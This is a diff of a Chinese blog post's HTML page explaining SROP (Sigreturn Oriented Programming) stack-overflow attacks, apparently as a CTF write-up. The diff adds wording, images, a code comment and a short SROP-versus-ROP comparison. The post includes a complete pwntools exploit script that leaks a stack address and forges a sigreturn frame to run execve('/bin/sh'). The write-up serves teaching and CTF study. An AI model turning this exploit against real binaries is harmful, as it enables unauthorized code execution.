@@ -177,7 +177,7 @@
             </div>
             <h2 class="post-title">栈溢出SROP攻击</h2>
             <div class="post-meta">
-                本文总共2183个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共2288个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
@@ -185,7 +185,7 @@
 <h4 id="SROP简介"><a href="#SROP简介" class="headerlink" title="SROP简介"></a>SROP简介</h4><ul>
 <li><p>SROP也即Sigreturn Oriented Programming。很显然这种攻击方式与Unix系统调用Sigreturn相关。它在发生signal的时候会被间接调用。</p>
 </li>
-<li><p>Signal在unix下的机制（窃图），发生signal时，会在user和kernel直接切换。系统会为当前进程保存上下文。完成后会恢复上下文。</p>
+<li><p>Signal在unix下的机制（窃图），发生signal时，会在user和kernel直接切换。系统会为当前进程保存上下文。完成后会从核心态退出时，会执行sigreturn恢复上下文。</p>
 <img src="/2019/09/25/栈溢出SROP攻击/1.png" title="[]">
 <p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p>
 <p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p>
@@ -194,17 +194,17 @@
 </li>
 </ul>
 <h4 id="SROP-Attack原理"><a href="#SROP-Attack原理" class="headerlink" title="SROP Attack原理"></a>SROP Attack原理</h4><ul>
-<li><p>问题出现在，内核保存的上下文是在用户态控制的（可以伪造的），而切换为用户态时，并没有检查这段内存是否发生改变。也就造成了可利用的可能。</p>
+<li><p>问题出现在，内核保存的上下文是在用户态控制的栈上（可以伪造的），而切换为用户态时，并没有检查这段内存是否发生改变。也就造成了可利用的可能。</p>
 </li>
 <li><p>攻击示意图</p>
 <img src="/2019/09/25/栈溢出SROP攻击/3.png" title="[]">
 </li>
 <li><p>上面的攻击中，需要满足以下几个条件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、 存在栈溢出</span><br><span class="line">2、可以泄露栈地址，（即可以知道参数的地址）</span><br><span class="line">3、需要syscall的地址</span><br><span class="line">4、需要sigreturn的地址</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、 存在栈溢出</span><br><span class="line">2、可以泄露栈地址，（即可以知道参数的地址）</span><br><span class="line">3、需要syscall的地址</span><br><span class="line">4、需要sigreturn的地址			（强制按照frame内存恢复进程状态）</span><br></pre></td></tr></table></figure>
 <p>相比较传统的ROP攻击，需要的gadgets更少，构造更方便。</p>
 </li>
 <li><p>连续攻击</p>
-<img src="/2019/09/25/栈溢出SROP攻击/4.png" title="[]">
+
 <p>只需要设置栈指针rsp的值为下一个攻击地址，同时rip的地址设置为&amp;(syscall; ret;)即可。</p>
 </li>
 </ul>
@@ -219,7 +219,7 @@
 <li><p>泄露libc地址，利用gadgets执行execve或者system或者one_gadget。</p>
 </li>
 <li><p>实际操作发现，rdx的值我们无法控制。execve和system都是行不通的。但是发现一个有趣的gadget</p>
-
+<img src="/2019/09/25/栈溢出SROP攻击/5.png" title="[]">
 <p>这里，实际提供了一个mov eax, 0; ret;的gadget。为one_gadget和read的syscall都可以提供基础。</p>
 </li>
 <li><p>可以one_gadget达到get shell的目的。</p>
@@ -228,7 +228,7 @@
 </li>
 <li><h5 id="SROP和攻击。"><a href="#SROP和攻击。" class="headerlink" title="SROP和攻击。"></a>SROP和攻击。</h5><ul>
 <li><p>看到这个题目很少人做出来，猜到应该不是这么简单的操作。而且程序中明确指出的gadget很奇怪</p>
-
+<img src="/2019/09/25/栈溢出SROP攻击/6.png" title="[]">
 <p>15的系统号是rt_sigreturn，3b的系统调用是execve。（我都没用到。。。）</p>
 </li>
 <li><p>搜索一番，看到<a href="[https://leppwn.github.io/2019/09/13/%E3%80%90BUUCTF%E3%80%91Pwn--ciscn_2019_s_3/](https://leppwn.github.io/2019/09/13/[BUUCTF]Pwn--ciscn_2019_s_3/">一个师傅</a>)的骚操作。</p>
@@ -236,12 +236,15 @@
 <li><p>就是我们上面提到的SROP攻击思路，泄露栈地址、并且syscall和rt_sigreturn的gadget都是有的。</p>
 </li>
 <li><p>学习一波，记录这种方式的exp（pwntools提供了Sigreturn Frame的构建）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">'\x00'</span> * <span class="number">8</span></span><br><span class="line">payload += p64(main)</span><br><span class="line">p.send(payload)					<span class="comment">#write(1, stack_addr, 0x30)</span></span><br><span class="line">								<span class="comment">#will leak an address on stack</span></span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span>	<span class="comment">#rsi</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr ==&gt; "</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#SROP Attack</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr					<span class="comment">#&amp;'/bin/sh'</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(rt_sigreturn)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += str(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">'\x00'</span> * <span class="number">8</span></span><br><span class="line">payload += p64(main)</span><br><span class="line">p.send(payload)					<span class="comment">#write(1, stack_addr, 0x30)</span></span><br><span class="line">								<span class="comment">#will leak an address on stack</span></span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span>	<span class="comment">#rsi</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr ==&gt; "</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#SROP Attack</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr					<span class="comment">#&amp;'/bin/sh'</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(rt_sigreturn)			<span class="comment">#强制sigreturn，改变frame</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += str(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+<h4 id="SROP与ROP的比较"><a href="#SROP与ROP的比较" class="headerlink" title="SROP与ROP的比较"></a>SROP与ROP的比较</h4><ul>
+<li>ROP的攻击方式比较普遍，安全防护相应的也比较多</li>
 </ul>
 <h4 id="SROP攻击的更多资料"><a href="#SROP攻击的更多资料" class="headerlink" title="SROP攻击的更多资料"></a>SROP攻击的更多资料</h4><ul>
 <li><a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="noopener">paper</a></li>
